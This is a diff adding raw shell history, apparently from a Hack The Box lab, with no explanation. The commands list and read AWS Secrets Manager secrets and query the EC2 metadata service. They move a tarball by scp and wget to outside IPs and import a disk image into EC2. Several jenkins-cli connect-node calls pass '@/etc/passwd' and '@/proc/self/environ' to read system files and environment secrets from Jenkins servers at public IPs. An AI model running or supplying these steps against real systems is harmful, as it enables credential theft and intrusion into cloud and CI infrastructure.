@@ -1,0 +1,48 @@
+
+   19  top
+   20  nc localhost 11337
+   21  aws
+   22  aws secretsmanager list-secrets
+   23  aws secretsmanager list-secrets --region us-west-1
+   24  aws secretsmanager get-secret-value --secret-id "arn:aws:secretsmanager:us-west-1:172221772559:secret:my_backup_lol_zzzzzzzz" --region us-west-1 --query SecretString --output text | jq '.'
+   25  aws secretsmanager get-secret-value --secret-id "arn:aws:secretsmanager:us-west-1:172221772559:secret:my_backup_lol_zzzzzzzz" --region us-west-1 --query SecretString --output text
+   26  aws secretsmanager get-secret-value --secret-id "arn:aws:secretsmanager:us-west-1:172221772559:secret:my_backup_lol_zzzzzzz" --region us-west-1 --query SecretString --output text
+   27  w
+   28  df
+   29  ls
+   30  ls -la
+   31  curl http://169.254.169.254/latest/meta-data/
+   32  curl http://169.254.169.254/latest/meta-data/region
+   33  curl -s http://169.254.169.254/latest/meta-data/placement/region
+
+ 2350* scp -o PreferredAuthentications=password -o PubkeyAuthentication=no alpine.tar  babywyrm@50.18.15.190:/home/babywyrm
+ 2352* rm alpine.tar
+ 2354* wget 192.168.1.130:8000/alpine.tar
+ 2356* scp -o PreferredAuthentications=password -o PubkeyAuthentication=no alpine.tar  babywyrm@50.18.15.190:/home/babywyrm
+
+ 2401* history
+ 2402* java -jar jenkins-cli.jar -s http://50.18.15.190:8080/  -http connect-node "@/proc/self/environ"
+ 2403* cd ..
+ 2404* java -jar jenkins-cli.jar -s http://50.18.15.190:8080/  -http connect-node "@/proc/self/environ"
+ 2405* java -jar jenkins-cli.jar -s http://54.153.46.179:8080/ -http connect-node "@/etc/passwd"
+ 2406* java -jar jenkins-cli.jar -s http://54.153.46.179:8080/ -http connect-node "@/proc/self/env"
+ 2407* java -jar jenkins-cli.jar -s http://54.153.46.179:8080/ -http connect-node "@/proc/self/environ"
+ 2408* sudo vi /etc/hosts
+
+##
+##
+##
+
+ 2247  cat containers.json
+ 2248  aws ec2 import-image --description "pours-EZ" --disk-containers "file:///Users/tms/HTB/Fail/AWS_IMPORT/containers.json"
+ 2249  watch "aws ec2 describe-import-image-tasks"
+ 2250  ls
+ 2251  cd .
+ 2252  cd ..
+ 2253  cd TERRA
+
+
+
+##
+##
+##
